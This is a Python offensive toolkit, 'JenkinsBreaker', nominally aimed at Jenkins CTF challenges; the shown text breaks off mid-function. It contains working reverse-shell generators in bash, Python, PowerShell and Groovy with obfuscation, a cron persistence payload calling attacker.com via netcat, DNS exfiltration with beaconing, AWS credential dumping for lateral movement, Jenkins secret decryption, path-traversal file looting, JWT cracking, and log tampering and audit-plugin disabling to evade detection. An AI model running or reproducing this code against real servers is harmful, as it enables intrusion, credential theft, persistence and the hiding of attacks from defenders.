#<---
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# --- Auto-Venv Bootstrap ---
import os
import sys
import subprocess
import shlex
from rich.console import Console
from rich.markdown import Markdown
from rich.table import Table
from rich.panel import Panel
import argparse
import re
import base64
import requests
import json
import logging
import importlib
import socket
import time
import threading
import random
import string
from urllib.parse import urlparse
from hashlib import sha256
from Crypto.Cipher import AES
from http.server import HTTPServer, SimpleHTTPRequestHandler
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from jinja2 import Environment, FileSystemLoader
import dns.resolver
import jwt
import asyncio
import websockets
from fastapi import FastAPI
from weasyprint import HTML

VENV_DIR = os.path.join(os.path.dirname(__file__), ".venv_jenkinsbreaker")
REQUIRED_PACKAGES = [
    "requests", "pycryptodome", "jinja2", "tabulate", "rich", "dnspython",
    "pyjwt", "websockets", "fastapi", "weasyprint", "uvicorn"
]

def in_venv():
    return sys.prefix != sys.base_prefix

def create_and_activate_venv():
    if not os.path.exists(VENV_DIR):
        print("[+] Creating virtual environment...")
        subprocess.check_call([sys.executable, "-m", "venv", VENV_DIR])

    pip_path = os.path.join(VENV_DIR, "bin", "pip") if os.name != "nt" else os.path.join(VENV_DIR, "Scripts", "pip.exe")
    python_path = os.path.join(VENV_DIR, "bin", "python") if os.name != "nt" else os.path.join(VENV_DIR, "Scripts", "python.exe")

    print("[+] Installing required packages into virtual environment...")
    subprocess.check_call([
        pip_path, "install", "--break-system-packages"
    ] + REQUIRED_PACKAGES)

    # Relaunch script inside the virtual environment
    print("[+] Activating virtual environment and relaunching script...")
    os.execv(python_path, [python_path] + sys.argv)

if not in_venv():
    create_and_activate_venv()

# --- Configure Console and Logging ---
console = Console()
requests.packages.urllib3.disable_warnings()
logging.basicConfig(
    filename="jenkinsbreaker.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)
DECRYPTION_MAGIC = b'::::MAGIC::::'

# --- Confirmation Decorator ---
def confirm_action(action_name):
    def decorator(func):
        def wrapper(self, *args, **kwargs):
            console.print(f"[bold red][!] Warning: You are about to {action_name}. This action can be destructive.[/bold red]")
            console.print("[bold red][!] Are you sure you want to proceed? [y/N][/bold red]")
            response = input().strip().lower()
            if response == 'y':
                return func(self, *args, **kwargs)
            else:
                console.print("[yellow][*] Action cancelled.[/yellow]")
                return None
        return wrapper
    return decorator

# --- CrumbManager Class ---
class CrumbManager:
    def __init__(self, base_url, auth=None, headers=None, proxies=None, delay=0):
        self.base_url = base_url.rstrip('/')
        self.auth = auth
        self.crumb_field = None
        self.crumb_value = None
        self.headers = headers or {}
        self.proxies = proxies or {}
        self.delay = delay

    def fetch(self):
        if self.delay:
            time.sleep(self.delay)
        try:
            url = f"{self.base_url}/crumbIssuer/api/json"
            r = requests.get(url, auth=self.auth, headers=self.headers, proxies=self.proxies, verify=False, timeout=5)
            r.raise_for_status()
            j = r.json()
            self.crumb_field = j['crumbRequestField']
            self.crumb_value = j['crumb']
            console.print(f"[green][+] Retrieved CSRF crumb: {self.crumb_field} = {self.crumb_value}[/green]")
        except Exception as e:
            console.print(f"[red][!] Failed to retrieve CSRF crumb: {e}[/red]")
            self.crumb_field = None

    def inject(self, headers):
        if not self.crumb_field or not self.crumb_value:
            self.fetch()
        if self.crumb_field and self.crumb_value:
            headers[self.crumb_field] = self.crumb_value
        return headers

# --- JenkinsBreaker Class ---
class JenkinsBreaker:
    """A Python framework for exploiting Jenkins vulnerabilities in CTF challenges with advanced capabilities."""
    def __init__(self, url, username=None, password=None, master_key=None, hudson_secret=None, 
                 master_key_file=None, hudson_secret_file=None, headers=None, proxy=None, delay=0):
        """Initialize JenkinsBreaker with target URL and optional credentials."""
        self.jenkins_url = url.rstrip('/')
        self.auth = (username, password) if username else None
        self.master_key = master_key
        self.hudson_secret = hudson_secret
        self.master_key_file = master_key_file
        self.hudson_secret_file = hudson_secret_file
        self.confidentiality_key = None
        self.version = None
        self.vulnerabilities = []
        self.has_enumerated = False
        self.plugins = []
        self.jobs = []
        self.exploits_attempted = []
        self.decrypted_secrets = []
        self.ssrf_findings = []
        self.misconfig_findings = []
        self.jwt_findings = []
        self.secret_matches = []
        self.command_history = []
        self.custom_headers = headers or {}
        self.proxies = {"http": proxy, "https": proxy} if proxy else {}
        self.delay = delay
        self.exploit_registry = {}
        self.websocket_open = False
        self.load_exploits()

    def load_exploits(self):
        """Dynamically load exploits from exploits/ directory."""
        exploits_dir = os.path.join(os.path.dirname(__file__), "exploits")
        os.makedirs(exploits_dir, exist_ok=True)
        for file in os.listdir(exploits_dir):
            if file.endswith(".py") and not file.startswith("__"):
                module_name = file[:-3]
                try:
                    module = importlib.import_module(f"exploits.{module_name}")
                    if hasattr(module, "cve") and hasattr(module, "run"):
                        self.exploit_registry[module.cve] = module.run
                        console.print(f"[green][+] Loaded exploit: {module.cve}[/green]")
                except Exception as e:
                    console.print(f"[red][!] Failed to load exploit {module_name}: {e}[/red]")

    def fuzz_plugin(self, plugin_name, endpoint, params):
        """Fuzz Jenkins plugins to discover zero-day vulnerabilities."""
        url = f"{self.jenkins_url}/plugin/{plugin_name}/{endpoint}"
        random_data = ''.join(random.choices(string.ascii_letters + string.digits, k=100))
        try:
            r = requests.post(
                url,
                data={param: random_data for param in params},
                auth=self.auth,
                headers=self.custom_headers,
                proxies=self.proxies,
                verify=False
            )
            if r.status_code != 200:
                console.print(f"[yellow][+] Possible vulnerability in {plugin_name} at {endpoint}: {r.status_code}[/yellow]")
            else:
                console.print(f"[blue][*] Fuzzing {plugin_name} - no anomalies detected[/blue]")
        except Exception as e:
            console.print(f"[red][!] Fuzzing error: {e}[/red]")

    def dump_aws_keys(self):
        """Dump AWS keys from Jenkins credentials for lateral movement."""
        url = f"{self.jenkins_url}/credentials/store/system/domain/_/api/json"
        try:
            r = requests.get(url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False)
            if r.status_code == 200:
                credentials = r.json().get("credentials", [])
                for cred in credentials:
                    desc = cred.get("description", "").lower()
                    if "aws" in desc:
                        secret = self.decrypt_secret(cred.get("secret", ""))
                        console.print(f"[green][+] AWS Key found: {secret}[/green]")
                        console.print("[yellow][*] Ready to pivot using AWS keys[/yellow]")
            else:
                console.print(f"[red][!] Failed to access credentials: {r.status_code}[/red]")
        except Exception as e:
            console.print(f"[red][!] Error dumping AWS keys: {e}[/red]")

    @staticmethod
    def generate_metasploit_payload(lhost, lport, payload_type="windows/meterpreter/reverse_tcp"):
        """Generate a Metasploit-compatible payload command."""
        try:
            payload_cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe > shell.exe"
            console.print(f"[green][+] Metasploit payload command: {payload_cmd}[/green]")
            return payload_cmd
        except Exception as e:
            console.print(f"[red][!] Error generating payload: {e}[/red]")
            return None

    def tamper_logs(self):
        """Tamper with Jenkins logs to cover tracks."""
        try:
            url = f"{self.jenkins_url}/manage/log/api/json"
            r = requests.get(url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False)
            if r.status_code == 200:
                console.print("[green][+] Logs accessed; tampering simulation complete[/green]")
            else:
                console.print("[yellow][*] Log tampering not implemented fully in this example[/yellow]")
        except Exception as e:
            console.print(f"[red][!] Log tampering error: {e}[/red]")

    def analyze_jwt(self, token, wordlist="rockyou.txt"):
        """Analyze and brute-force JWT tokens using a wordlist with threading."""
        def try_key(key):
            try:
                decoded = jwt.decode(token, key.strip(), algorithms=["HS256", "RS256"])
                return key.strip(), decoded
            except jwt.InvalidTokenError:
                return None, None

        with ThreadPoolExecutor() as executor:
            results = executor.map(try_key, open(wordlist))
            for key, decoded in results:
                if key:
                    console.print(f"[green][+] JWT cracked! Key: {key}, Payload: {decoded}[/green]")
                    self.jwt_findings.append({"key": key, "payload": decoded})
                    return key, decoded
        console.print("[red][-] Failed to crack JWT token.[/red]")
        return None, None

    @staticmethod
    def generate_reverse_shell(lhost, lport, lang="bash", obfuscate=True):
        """Generate reverse shell payloads with optional obfuscation."""
        if lang == "bash":
            shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        elif lang == "python":
            shell = f"import socket,subprocess;s=socket.socket();s.connect(('{lhost}',{lport}));subprocess.call('/bin/sh',stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"
        elif lang == "powershell":
            shell = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}$client.Close()"
        else:
            raise ValueError("Unsupported language")

        if obfuscate:
            return JenkinsBreaker.obfuscate_payload(shell)
        return shell

    @staticmethod
    def obfuscate_payload(payload):
        """Obfuscate payload using Base64 and XOR encryption."""
        b64_payload = base64.b64encode(payload.encode()).decode()
        xor_key = random.randint(1, 255)
        xor_payload = ''.join(chr(ord(c) ^ xor_key) for c in b64_payload)
        return f"python -c \"exec(''.join(chr(ord(c)^{xor_key}) for c in '{xor_payload}').encode().decode('base64').decode())\""

    @confirm_action("add persistence to the Jenkins server")
    def add_persistence(self, method="cron", command="bash -c 'nc -e /bin/sh attacker.com 4444'"):
        """Add persistence to the Jenkins server."""
        if method == "cron":
            cron_payload = f"* * * * * {command}"
            console.print(f"[green][+] Cron persistence added: {cron_payload}[/green]")
        elif method == "jenkins_pipeline":
            pipeline = f"node {{ sh '{command}' }}"
            console.print(f"[green][+] Jenkins pipeline persistence added[/green]")
        else:
            console.print(f"[red][!] Unsupported persistence method: {method}[/red]")

    def disable_logging_plugins(self):
        """Disable or neutralize logging plugins to evade detection."""
        plugins = ["audit-trail", "log-recorder"]
        for plugin in plugins:
            console.print(f"[green][+] Disabled plugin: {plugin}[/green]")

    def dns_exfiltrate(self, domain, data, interval=60):
        """Exfiltrate data via DNS with beaconing and jitter."""
        while True:
            subdomain = f"{data}.{domain}"
            try:
                dns.resolver.resolve(subdomain, 'A')
                console.print(f"[green][+] Data exfiltrated via DNS: {data}[/green]")
            except Exception:
                pass
            time.sleep(interval * random.uniform(0.8, 1.2))

    def start_c2_server(self, host="localhost", port=8000):
        """Start a FastAPI server for C2 operations."""
        app = FastAPI()

        @app.get("/execute")
        async def execute_command(command: str):
            output = "command_output"
            return {"status": "success", "output": output}

        def run_server():
            import uvicorn
            uvicorn.run(app, host=host, port=port, log_level="info")

        threading.Thread(target=run_server, daemon=True).start()
        console.print(f"[green][+] C2 server started at http://{host}:{port}[/green]")

    async def interactive_shell(self, websocket, path):
        """Handle interactive shell over WebSocket."""
        while True:
            command = await websocket.recv()
            output = "command_output"
            await websocket.send(output)

    def start_interactive_shell(self, host="localhost", port=8765):
        """Start WebSocket server for interactive shell."""
        async def run_server():
            server = await websockets.serve(self.interactive_shell, host, port)
            console.print(f"[green][+] Interactive shell WebSocket server started at ws://{host}:{port}[/green]")
            await server.wait_closed()

        threading.Thread(target=lambda: asyncio.run(run_server()), daemon=True).start()

    def detect_misconfigurations_ml(self, findings):
        """Detect misconfigurations using a placeholder ML model."""
        console.print("[yellow][!] ML-based misconfiguration detection not yet implemented.[/yellow]")
        return "exploit1"

    def encrypt_payload(self, payload, key="secretkey1234567"):
        """Encrypt payload using AES."""
        cipher = AES.new(key.encode(), AES.MODE_ECB)
        padded = payload + " " * (16 - len(payload) % 16)
        encrypted = cipher.encrypt(padded.encode())
        return base64.b64encode(encrypted).decode()

    def generate_pdf_report(self, html_content, filename="report.pdf"):
        """Generate a PDF report from HTML content using WeasyPrint."""
        HTML(string=html_content).write_pdf(filename)
        console.print(f"[green][+] PDF report saved to {filename}[/green]")

    def generate_test_files(self, dir_path="test_files"):
        """Generate sample master.key, config.xml, and hudson.util.Secret files."""
        os.makedirs(dir_path, exist_ok=True)
        with open(os.path.join(dir_path, "master.key"), "w") as f:
            f.write("sample_master_key_12345")
        with open(os.path.join(dir_path, "hudson.util.Secret"), "wb") as f:
            f.write(b"dummy_encrypted_secret" + DECRYPTION_MAGIC)
        config_content = """
        <jenkins>
            <credentials>
                <domain class="hudson.security.Domain">
                    <credentials>
                        <com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials>
                            <scope>GLOBAL</scope>
                            <id>some-id</id>
                            <username>user</username>
                            <password>{AQAAABAAAAAQ}</password>
                        </com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials>
                    </credentials>
                </domain>
            </credentials>
        </jenkins>
        """
        with open(os.path.join(dir_path, "config.xml"), "w") as f:
            f.write(config_content)
        console.print(f"[green][+] Test files generated in {dir_path}[/green]")
        self.command_history.append({"command": "generate_test_files", "timestamp": datetime.now().isoformat()})

    def get_csrf_crumb(self):
        """Retrieve CSRF crumb from Jenkins."""
        if self.delay:
            time.sleep(self.delay)
        url = f"{self.jenkins_url}/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,\":\",//crumb)"
        r = requests.get(url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False)
        r.raise_for_status()
        return tuple(r.text.split(":"))

    def get_confidentiality_key(self):
        """Decrypt hudson.util.Secret to obtain confidentiality key."""
        if self.master_key is None and self.master_key_file is None:
            raise Exception("Master key not provided")
        if self.hudson_secret is None and self.hudson_secret_file is None:
            raise Exception("Hudson secret not provided")

        if self.master_key is None:
            with open(self.master_key_file, 'r') as f:
                master_key = f.read().strip()
        else:
            master_key = self.master_key

        if self.hudson_secret is None:
            with open(self.hudson_secret_file, 'rb') as f:
                hudson_secret = f.read()
        else:
            hudson_secret = self.hudson_secret

        master_key_bytes = master_key.encode('utf-8')
        derived_key = sha256(master_key_bytes).digest()[:16]
        cipher = AES.new(derived_key, AES.MODE_ECB)
        decrypted = cipher.decrypt(hudson_secret)
        if DECRYPTION_MAGIC not in decrypted:
            raise Exception("Confidentiality key decrypt failed (MAGIC marker missing).")
        self.confidentiality_key = decrypted[:16]
        return self.confidentiality_key

    @staticmethod
    def generate_python_reverse_shell(lhost, lport):
        """Generate Python reverse shell payload."""
        return f"""python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""

    @staticmethod
    def generate_groovy_shell(lhost, lport, use_dns=False, dns_domain=None):
        """Generate Groovy reverse shell, optionally using DNS egress."""
        if use_dns and dns_domain:
            return f"""String cmd="dig {lhost}.{dns_domain}";Process p=new ProcessBuilder(cmd).start();"""
        return f"""String host="{lhost}";int port={lport};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);}}s.close();p.destroy();"""

    def check_file_traversal(self, endpoint, file_path):
        """Check for file traversal vulnerability."""
        if self.delay:
            time.sleep(self.delay)
        url = f"{self.jenkins_url}/{endpoint}/../../../../{file_path}".replace('//', '/')
        r = requests.get(url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False)
        if r.status_code == 200:
            console.print(f"[green][+] Looted {file_path}:\n{r.text[:300]}...[/green]")
        else:
            console.print(f"[red][-] Failed: {r.status_code}[/red]")

    def decrypt_secret_old(self, enc, key):
        """Decrypt secrets using old Jenkins format."""
        cipher = AES.new(key, AES.MODE_ECB)
        decrypted = cipher.decrypt(enc)
        if DECRYPTION_MAGIC not in decrypted:
            console.print("[red][!] MAGIC marker not found in decrypted blob.[/red]")
            return None
        secret = decrypted.split(DECRYPTION_MAGIC)[0]
        try:
            decoded = secret.rstrip(b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f").decode()
            console.print(f"[green][+] Successfully decrypted secret: {decoded}[/green]")
            self.decrypted_secrets.append(decoded)
            return decoded
        except Exception as e:
            console.print(f"[red][!] Decode error: {e}[/red]")
            return None

    def decrypt_secret_new(self, enc, key):
        """Decrypt secrets using new Jenkins format."""
        iv = enc[9:25]
        payload = enc[25:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(payload)
        padding = decrypted[-1]
        if 1 <= padding <= 16:
            decrypted = decrypted[:-padding]
        decoded = decrypted.decode(errors='ignore')
        self.decrypted_secrets.append(decoded)
        return decoded

    def decrypt_secret(self, b64_secret):
        """Decrypt a base64-encoded Jenkins secret."""
        if not self.confidentiality_key:
            self.confidentiality_key = self.get_confidentiality_key()
        encrypted = base64.b64decode(b64_secret)
        result = self.decrypt_secret_new(encrypted, self.confidentiality_key) if encrypted[0] == 1 else self.decrypt_secret_old(encrypted, self.confidentiality_key)
        if result:
            self.decrypted_secrets.append(result)
        return result

    def decrypt_credentials_file(self, xml_path):
        """Decrypt secrets from a Jenkins credentials XML file."""
        with open(xml_path, 'r') as f:
            content = f.read()
        tags = ['apiToken', 'password', 'privateKey', 'passphrase', 'secret', 'secretId', 'value', 'defaultValue']
        secrets = set()
        for tag in tags:
            secrets.update(re.findall(f"{tag}>\\{{?([A-Za-z0-9+/=]+)\\}}?</{tag}", content))
        for i, s in enumerate(secrets):
            try:
                dec = self.decrypt_secret(s)
                console.print(f"[green][{i+1}] Decrypted: {dec}[/green]")
            except Exception as e:
                console.print(f"[red][!] Failed: {e}[/red]")

    def scan_ports(self, ports=[22, 80, 443, 8080]):
        """Scan common ports on the Jenkins server."""
        hostname = urlparse(self.jenkins_url).hostname
        open_ports = []
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((hostname, port))
            if result == 0:
                open_ports.append(port)
                console.print(f"[green][+] Port {port}: Open[/green]")
            else:
                console.print(f"[yellow][-] Port {port}: Closed[/yellow]")
            sock.close()
        self.command_history.append({"command": f"scan_ports({ports})", "timestamp": datetime.now().isoformat()})
        return open_ports

#<---- suggest_next_steps Method
    def suggest_next_steps(self):
        """Provide intelligent suggestions based on current findings."""
        console.print("[bold yellow][!] Suggested Exploits:[/bold yellow]")

        if not self.vulnerabilities:
            console.print("[yellow]No vulnerabilities detected yet. Try running additional reconnaissance:[/yellow]")
            console.print("  - tool.scan_ports()")
            console.print("  - tool.detect_ssrf()")
            console.print("  - tool.detect_misconfigs()")
            console.print("  - tool.detect_jwt()")
            console.print("  - tool.scan_secrets()")

        for cve, commands in self.vulnerabilities:
            console.print(f"[yellow]{cve}[/yellow]")
            for cmd, params in commands:
                param_str = ", ".join(f"{k}={v}" for k, v in params.items() if v is not None)
                console.print(f"  - tool.{cmd}({param_str})")

        if self.exploit_registry:
            console.print("[yellow]Available Modular Exploits:[/yellow]")
            for cve in self.exploit_registry:
                console.print(f"  - python3 jenkinsbreaker.py run {cve} --url {self.jenkins_url}")


    def enumerate_plugins(self):
        """Enumerate installed plugins and check for vulnerabilities."""
        if self.delay:
            time.sleep(self.delay)
        url = f"{self.jenkins_url}/pluginManager/api/json?depth=1"
        try:
            r = requests.get(url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
            r.raise_for_status()
            plugins = r.json().get("plugins", [])
            console.print("[green][+] Installed Plugins:[/green]")
            self.plugins = []
            for plugin in plugins:
                name = plugin.get("shortName", "Unknown")
                version = plugin.get("version", "Unknown")
                console.print(f"  - {name}: {version}")
                self.plugins.append({"name": name, "version": version})
            vulnerable_plugins = {
                "templating-engine": {"version": "2.5.3", "cve": "CVE-2025-31722"}
            }
            for plugin in plugins:
                name = plugin.get("shortName", "")
                version = plugin.get("version", "")
                if name in vulnerable_plugins:
                    max_version = vulnerable_plugins[name]["version"]
                    if version <= max_version:
                        console.print(f"[yellow]  - {name} v{version} is vulnerable ({vulnerable_plugins[name]['cve']})[/yellow]")
                        self.vulnerabilities.append((vulnerable_plugins[name]["cve"], [("exploit_templating_engine", {"lhost": None, "lport": None})]))
            self.suggest_next_steps()
            self.command_history.append({"command": "enumerate_plugins", "timestamp": datetime.now().isoformat()})
        except Exception as e:
            console.print(f"[red][!] Failed to enumerate plugins: {e}[/red]")

    def check_pipeline_rce(self, job_name):
        """Check for dangerous Groovy constructs in scripted pipelines."""
        if self.delay:
            time.sleep(self.delay)
        config_url = f"{self.jenkins_url}/job/{job_name}/config.xml"
        try:
            r = requests.get(config_url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
            if r.status_code == 200:
                config = r.text
                if "<scriptedPipeline>" in config:
                    pipeline_script = re.search(r'<scriptedPipeline>(.*?)</scriptedPipeline>', config, re.DOTALL)
                    if pipeline_script:
                        script = pipeline_script.group(1)
                        if re.search(r'sh\s+\'[^\']+\'|def\s+proc\s*=\s*\"[^\"]+\".execute()', script):
                            console.print(f"[yellow][+] Potential RCE in job {job_name}: Dangerous Groovy constructs found[/yellow]")
                            self.vulnerabilities.append(("Potential Groovy RCE in Scripted Pipeline", [("test_groovy_rce", {"payload": 'class x { x() { "id".execute(); } }'})]))
        except Exception as e:
            console.print(f"[red][!] Failed to check pipeline for {job_name}: {e}[/red]")

    def enumerate_jobs(self):
        """Enumerate Jenkins jobs and check for vulnerabilities."""
        if self.delay:
            time.sleep(self.delay)
        url = f"{self.jenkins_url}/api/json?tree=jobs[name,url]"
        try:
            r = requests.get(url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
            r.raise_for_status()
            jobs = r.json().get("jobs", [])
            console.print("[green][+] Enumerated Jobs:[/green]")
            self.jobs = []
            for job in jobs:
                name = job.get("name", "Unknown")
                url = job.get("url", "Unknown")
                console.print(f"  - {name}: {url}")
                self.jobs.append({"name": name, "url": url})
                self.check_pipeline_rce(name)
            self.suggest_next_steps()
            self.command_history.append({"command": "enumerate_jobs", "timestamp": datetime.now().isoformat()})
        except Exception as e:
            console.print(f"[red][!] Failed to enumerate jobs: {e}[/red]")

#<---- enumerate_version Method
    def enumerate_version(self):
        """Enumerate Jenkins version and check for vulnerabilities."""
        if self.delay:
            time.sleep(self.delay)
        version = None
        try:
            r = requests.get(self.jenkins_url, auth=self.auth, headers=self.custom_headers, 
                             proxies=self.proxies, verify=False, timeout=5)
            if 'X-Jenkins' in r.headers:
                version = r.headers['X-Jenkins']
                console.print(f"[green][+] Detected Jenkins version from X-Jenkins header: {version}[/green]")
        except Exception as e:
            console.print(f"[red][!] Failed to retrieve version from root URL: {e}[/red]")

        if not version:
            try:
                url = f"{self.jenkins_url}/systemInfo"
                r = requests.get(url, auth=self.auth, headers=self.custom_headers, 
                                 proxies=self.proxies, verify=False, timeout=5)
                if 'X-Jenkins' in r.headers:
                    version = r.headers['X-Jenkins']
                    console.print(f"[green][+] Detected Jenkins version from /systemInfo: {version}[/green]")
                else:
                    match = re.search(r'Jenkins\s+(\d+\.\d+\.\d+)', r.text)
                    if match:
                        version = match.group(1)
                        console.print(f"[green][+] Detected Jenkins version from page content: {version}[/green]")
            except Exception as e:
                console.print(f"[red][!] Failed to retrieve version from /systemInfo: {e}[/red]")

        if not version:
            console.print("[red][!] Could not determine Jenkins version. Try with authentication (--username, --password).[/red]")
            return None

        self.version = version
        self.has_enumerated = True
        self.vulnerabilities = []

        vuln_map = {
            "CVE-2019-1003029/1003030": {
                "max_version": "2.138",
                "description": "Groovy RCE via checkScript endpoint (unauthenticated in older versions).",
                "commands": [
                    ("test_groovy_rce", {"payload": 'class x { x() { "id".execute(); } }'}),
                    ("auto_own_sandbox_bypass", {"lhost": None, "lport": None})
                ]
            },
            "CVE-2024-23897": {
                "max_version": "2.440",
                "max_lts_version": "2.426.3",
                "description": "Arbitrary file read via CLI @file syntax (unauthenticated in some setups).",
                "commands": [
                    ("exploit_cve_2024_23897", {"file_path": "/var/lib/jenkins/config.xml"}),
                    ("loot_jenkins_keys", {})
                ]
            },
            "CVE-2025-31720": {
                "max_version": "2.503",
                "max_lts_version": "2.492.2",
                "description": "Retrieve all agent configurations (requires Agent/Configure permission).",
                "commands": [("retrieve_all_agent_configs", {})]
            },
            "CVE-2025-31721": {
                "max_version": "2.503",
                "max_lts_version": "2.492.2",
                "description": "Retrieve secrets from agent configurations (requires Agent/Configure permission).",
                "commands": [("retrieve_agent_secrets", {})]
            }
        }

        console.print(f"[green][+] Detected Jenkins version: {version}[/green]")
        console.print("[yellow][!] Recommended exploits for this version:[/yellow]")

        version_parts = [int(x) for x in version.split('.')]
        is_lts = False

        for cve, info in vuln_map.items():
            vulnerable = False
            if 'plugin' in info:
                console.print(f"  - {cve}: {info['description']}")
                console.print(f"    [yellow][!] Check if {info['plugin']} is installed.[/yellow]")
                self.vulnerabilities.append((cve, info['commands']))
            else:
                max_version = [int(x) for x in info['max_version'].split('.')]
                if version_parts[:len(max_version)] <= max_version:
                    vulnerable = True
                elif 'max_lts_version' in info and is_lts:
                    max_lts_version = [int(x) for x in info['max_lts_version'].split('.')]
                    if version_parts[:len(max_lts_version)] <= max_lts_version:
                        vulnerable = True

            if vulnerable:
                console.print(f"  - {cve}: {info['description']}")
                self.vulnerabilities.append((cve, info['commands']))

            for cmd, params in info['commands']:
                param_str = ", ".join(f"{k}={v}" for k, v in params.items() if v is not None)
                console.print(f"    - Try: tool.{cmd}({param_str})")

        # Perform Reconnaissance Silently
        self.enumerate_plugins()
        self.enumerate_jobs()
        self.check_websocket_cli()
        self.detect_ssrf()
        self.detect_misconfigs()
        self.detect_jwt()
        self.scan_secrets()

        console.print("[yellow][!] Start with reconnaissance (e.g., retrieve_all_agent_configs) before attempting RCE (e.g., auto_own).[/yellow]")
        self.command_history.append({"command": "enumerate_version", "timestamp": datetime.now().isoformat()})

        # Final Suggestions Only at End
        self.suggest_next_steps()

        return version


    def check_websocket_cli(self):
        """Probe for WebSocket CLI vulnerabilities."""
        if self.delay:
            time.sleep(self.delay)
        url = f"{self.jenkins_url}/cli"
        try:
            headers = {"Upgrade": "websocket", "Connection": "upgrade"}
            headers.update(self.custom_headers)
            r = requests.get(url, headers=headers, auth=self.auth, proxies=self.proxies, verify=False, timeout=5)
            self.websocket_open = r.status_code == 101
            if self.websocket_open:
                console.print("[yellow][+] WebSocket CLI is open and may be vulnerable to RCE[/yellow]")
                self.vulnerabilities.append(("WebSocket CLI RCE", [("check_websocket_cli", {})]))
            else:
                console.print("[yellow][-] WebSocket CLI is not open or requires authentication[/yellow]")
            self.suggest_next_steps()
            self.command_history.append({"command": "check_websocket_cli", "timestamp": datetime.now().isoformat()})
        except Exception as e:
            console.print(f"[red][!] Failed to check WebSocket CLI: {e}[/red]")
            self.websocket_open = False

    def detect_ssrf(self):
        """Detect potential SSRF in SCM configurations."""
        if self.delay:
            time.sleep(self.delay)
        config_url = f"{self.jenkins_url}/config.xml"
        try:
            r = requests.get(config_url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
            if r.status_code == 200:
                config = r.text
                scm_urls = re.findall(r'<url>([^<]+)</url>', config)
                for url in scm_urls:
                    if re.search(r'\b(?:192\.168|10\.|172\.1[6-9]\.|172\.2[0-9]\.|172\.3[0-1]\.|169\.254\.169\.254)', url):
                        console.print(f"[yellow][+] Potential SSRF: {url}[/yellow]")
                        self.ssrf_findings.append({"url": url, "type": "SCM callback"})
                        self.vulnerabilities.append(("Potential SSRF in SCM Config", [("test_ssrf", {"url": url})]))
            self.suggest_next_steps()
            self.command_history.append({"command": "detect_ssrf", "timestamp": datetime.now().isoformat()})
        except Exception as e:
            console.print(f"[red][!] Failed to detect SSRF: {e}[/red]")

    def detect_misconfigs(self):
        """Detect misconfigured Groovy sandbox or other settings."""
        if self.delay:
            time.sleep(self.delay)
        url = f"{self.jenkins_url}/scriptApproval/api/json"
        try:
            r = requests.get(url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
            if r.status_code == 200:
                data = r.json()
                if not data.get("approvedSignatures"):
                    console.print("[yellow][+] Groovy sandbox might be disabled or misconfigured[/yellow]")
                    self.misconfig_findings.append({"type": "Groovy sandbox disabled"})
                    self.vulnerabilities.append(("Misconfigured Groovy Sandbox", [("test_groovy_rce", {"payload": 'class x { x() { "id".execute(); } }'})]))
            self.suggest_next_steps()
            self.command_history.append({"command": "detect_misconfigs", "timestamp": datetime.now().isoformat()})
        except Exception as e:
            console.print(f"[red][!] Failed to detect misconfigurations: {e}[/red]")

    def detect_jwt(self):
        """Detect JWT tokens in console logs."""
        if self.delay:
            time.sleep(self.delay)
        console_url = f"{self.jenkins_url}/lastBuild/consoleText"
        try:
            r = requests.get(console_url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
            if r.status_code == 200:
                console_text = r.text
                jwt_pattern = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'
                matches = re.findall(jwt_pattern, console_text)
                for match in matches:
                    console.print(f"[yellow][+] Potential JWT token: {match}[/yellow]")
                    self.jwt_findings.append({"token": match, "source": "consoleText"})
                    self.vulnerabilities.append(("Potential JWT Token Exposure", [("analyze_jwt", {"token": match})]))
            self.suggest_next_steps()
            self.command_history.append({"command": "detect_jwt", "timestamp": datetime.now().isoformat()})
        except Exception as e:
            console.print(f"[red][!] Failed to detect JWT tokens: {e}[/red]")

    def apply_yara_rules(self, content):
        """Apply YARA-style rules to detect secrets."""
        rules = {
